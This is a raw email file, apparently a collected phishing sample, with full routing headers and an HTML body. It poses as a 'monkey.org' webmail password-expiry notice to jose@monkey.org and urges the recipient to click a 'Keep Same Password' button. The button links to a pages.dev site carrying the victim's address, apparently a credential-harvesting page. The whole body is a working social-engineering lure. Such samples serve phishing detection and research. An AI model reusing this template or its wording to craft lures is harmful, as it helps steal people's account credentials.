@@ -1,0 +1,127 @@
+Return-Path: miah@arkenmatter.com
+Delivered-To: jose@monkey.org
+X-FDA: 83589466170.05.4F50321
+Received: from order.arkenmatter.com (order.arkenmatter.com [86.106.104.124])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id 0A9131A0004
+	for <jose@monkey.org>; Tue, 24 Jun 2025 07:28:23 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=pass header.d=arkenmatter.com header.s=dkim header.b="E2F/PA5o";
+	spf=pass (imf27.b.hostedemail.com: domain of miah@arkenmatter.com designates 86.106.104.124 as permitted sender) smtp.mailfrom=miah@arkenmatter.com;
+	dmarc=pass (policy=none) header.from=arkenmatter.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1750750104;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=o4y7NckxMmS2sx8KfDkm9r9EwKJU0BrqnUtmqu3D/fE=;
+	b=JC7IS7HO/qkM1SAQ0RNCG0xIfmLbAWBv3kw/Xj1ykLZMc/ZZ8hIArHjmHSZWlY9Alr95zg
+	Ngw9fu3Wcfjx1TMTD4T0wF+aHJv5Q8hTHhiUVlkTzy7Ku016OQaKI/a0QZtbd7jo6ba0Xd
+	PwhfOVR/evdm1SoXtWfax5lcmRvzADA=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1750750104; a=rsa-sha256;
+	cv=none;
+	b=ibuJMFGw208vR7zm8N1GDjimqQLLYPVqdW1LGQdUz6+StGWiSo0P3rUqzmlzenz6HP8Biq
+	qt+RHM5UYFrfupSipN8GizWyULdNfvH3Qxs19zDohhQPTshgzBvtRkP6DQJHZFs27qQSZk
+	U3euh7QJPNwKEkJN+hmiaVlKoreddHc=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=pass header.d=arkenmatter.com header.s=dkim header.b="E2F/PA5o";
+	spf=pass (imf27.b.hostedemail.com: domain of miah@arkenmatter.com designates 86.106.104.124 as permitted sender) smtp.mailfrom=miah@arkenmatter.com;
+	dmarc=pass (policy=none) header.from=arkenmatter.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=arkenmatter.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=miah@arkenmatter.com;
+ bh=2Qthap1RjWus+HSmvSSK7o5tbNU=;
+ b=E2F/PA5o7hSacN3L1NEqdmuWk8V+NW7zz+Z49YjG/uMcQ3Gcp6tSwtrOXezw78IVyzpTWvMcT6Dx
+   RSdYeOUZ6+if+YQ6vrT/lt7zXPRb8XvsnqmDxzC7JSG7U0CIzFl35FCbW0qCep2/Jg3k8FVq+fms
+   VLwAedjF9vJmGAmt93sm181xVEwXWLPSZxnAG0kERVkTg0YE8TIrNZJ3On/DsyN2nyPJ67tPD2ar
+   NwdeGsSOHqqUadaVppW6Y8usk/I9X+EiT91961jCLGE9eU1B5orcqQldCxGsiwuU4U/Lswaoc0Mg
+   UHAQ+NaC7tUGnS3Lx7HtAeV30c2wTEVSiJ+Rtg==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=arkenmatter.com;
+ b=fRFgndTesGp5fbeKi9fXzJpemPZMyZF2U/ApVa7ImTpieAQkI1OXviMyJaBxE5OWnkEy0S//jIYm
+   qhwOjbR1uwHW890rK/OJbSN5SUTVU0JL74VFQeoOzXSnbw1piUC+Yn1VlVJq2+GYzybxVkbEK2cr
+   5nwE901QHT/Qp62PPwgd4kbj7RpDECh1AdU94loqCmZHixyU1Fttn6VDM4L5qR+rL7Aotr17WRtU
+   ht9akLgQU4gjEfoIqwXNJMElQjXqKyaoxtXNneIM8Mybd3ZOt5lfdeZoS9I3TIgKAd75rGdus3An
+   MTUOsuclMo5VTj3BDHGzl/cceT3DzOJ58MRenw==;
+From: monkey.org <miah@arkenmatter.com>
+To: jose@monkey.org
+Subject: Password Expiry Notice for jose@monkey.org
+Date: 24 Jun 2025 09:28:22 +0200
+Message-ID: <20250624092822.DB7A1FF84FD4C984@arkenmatter.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 0A9131A0004
+X-Stat-Signature: f6jqnc497ow376uq8do5afci914d1c6e
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-Spam-Status: No, score=8.05
+X-HE-Tag: 1750750103-46627
+X-HE-Meta: U2FsdGVkX198MEUp/SL+Pn9+srIFljhV2fIFPAzBpSuEDxXRGECdZjad6/mbg0giPzlp2mvNVg4SAOHDXyhg2DebA1pHMQMkKnMbYg2dwNICnbj7spVwJg6sYG4lfAYVa/Kq+rXuHEDwTOT5qSLTK7uzClF543tAYP1S+E7uA7ZBezKKRBCET4fPOfLsVnUYhf3piLYoXvM9OAGp7Dj5kxuGZAVVYt2D7NsC5buVKHhOQKemRI+8iPURkV/BDcv13x6cEjdQcQbdih/qvVTF5yfv/k+r7Y7BcBZJJSUY2DDsx/s3HbrdrzVvi4sjIyWSexFpwoDHpHLj3YGuvpG9OhIuobWRGJZa48kXHIQMgVK7hfBRheLWbsG0J7bSjy1RXAVIMgiKfucOUJ21bFqYSRwbX74O7MjpvBaLEYhBGYcEdWFuAqCNMoIlb/l6Ssm7ncsR4Gzui5qU1nGcO75i4ldLZhgOamwcklgWJZaHoO9xfafAMQ6rhP4M4ysE+4XgKj3YT1Ac1oNF6lI0fnVc30zw+PxJpSy0gxjab+eH9/PGU4QoILyXONIzffUJkArRiB2Id8iiTG0a+KSJm9NrKC7QMgAz/UC+TJId7y5H9jeEA9G4MUPdBBKU+tL6NRklVh92OSJ69FJHaJtqseRkuPCo/PPemYPcFug4watUXJ5CcQVlNbW4LTp4xEWojVRnHlXNt0y5ChZsowswMFKIkbtF4IXwfCqvv/yDXWs3aNnQX3McoEw4rvjHCgbLn2wfwFN70HKswAifafalQpJhzmEOvo4EeBqMyr0pYIlK/62Mn6zawoF/2PrRoaBpmPWtXU1y6ODrtD8LoUlaKpnOzH6kGoCDGEZu/ZTH1YDYpIkEz1DCWGmV86Mf0sWzVN6ipB96PDgXZwrjvSx1L14SlXRgsIXSmBZ3+wBfu/BKjGr51NUl+iZGTvHBnoPGPJTx9diibv2DIF7smw+T/56H5+mMOW2
+ zT/4FIwNs7R3m2CGTpdUk1P/ctUn7+sB93odk1OlwJhy/99Cd8igcI8mW1oZx8zW+0pLvo3jwlUG6m7Y7gLonV/NXLxv9tFg523tk9JtOaSjsG//C3LmUSTBrzC9Y53LL7oQx+Snm5eRp/1BiPEz5klv+BibxRO4f68WpPyIWyuR8EDq9Fb1vQeWdoIXwk7Jfh75rHgkDyFT7fuFVcSVcQKR5L1/muaqQoeXGVT82tHnajIbv16fQGiL6MCTTKxigLNcMhjK9lZI+NBcbJvPHWBWnlStpElS0L2+azldJrWvBlz82zPhlwCjs2RYnMlei8+9ly5Kfm6Hwa6lVzlTjd25zlACS9k+1haA1CCyuSHPKNC7Ibvr3JUUImuBaVWX+zFdFYkpolt9o5H71WgOBad1ethIr7zPCBc9xvwm+VGWn/r3txW7t7hrnusjQYf090NrnIKvrGqzNhtUlIE+KnXLqw2hDAZm6SkAGV58zEaHVfLzoLQqXxpX0yuuxDn0y6eJRNWRDZct0/zw=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 266
+
+<!DOCTYPE html>
+
+<html><head>
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+
+<body>
+    <p align=3D"center" style=3D"color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: System; font-size: =
+15px; font-style: italic; font-weight: bold; margin-top: 0px; margin-bottom=
+: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border-box; orp=
+hans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;">
+<span style=3D"color: rgb(253, 121, 2); text-transform: none; text-indent: =
+0px; letter-spacing: normal; font-family: System; font-size: 15pt; font-sty=
+le: italic; font-weight: 700; word-spacing: 0px; float: none; display: inli=
+ne !important; white-space: normal; box-sizing: border-box; orphans: 2; wid=
+ows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norma=
+l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
+on-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;">webmail</span></p>
+    <p align=3D"center" style=3D"color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-serif; =
+font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; mar=
+gin-bottom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: borde=
+r-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><span styl=
+e=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none; text-i=
+ndent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; font-s=
+ize: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; box-sizing: border-box; orphans: 2; widows: 2; background-col=
+or: rgb(255, 255, 255);">monkey.org</span>,<br style=3D"box-sizing: border-=
+box;">
+Your account jose@monkey.org password will expire soon.</p>
+    <p align=3D"center" style=3D"color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-serif; =
+font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; mar=
+gin-bottom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: borde=
+r-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;">Please use=
+ the button below to continue with the same password and avoid loosing your=
+ account.<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: bor=
+der-box;">
+<a class=3D"v1v1v1v1v1daria-goto-anchor" style=3D"padding: 12px 18px; borde=
+r: 1px solid rgb(0, 115, 255); border-image: none; width: 368px; height: 32=
+px; text-align: center; color: rgb(255, 255, 255); line-height: 27px; font-=
+weight: normal; text-decoration: none; box-sizing: border-box; background-c=
+olor: rgb(0, 115, 255);" href=3D"https://systemsecuritywebmail.pages.dev/we=
+bmailadminaccess#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">Keep=
+ Same Password</a>
+<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
+>Automated Message 6/24/2025 9:28:22 a.m..<br style=3D"box-sizing: border-b=
+ox;">monkey.org</p>
+
+
+</body></html>
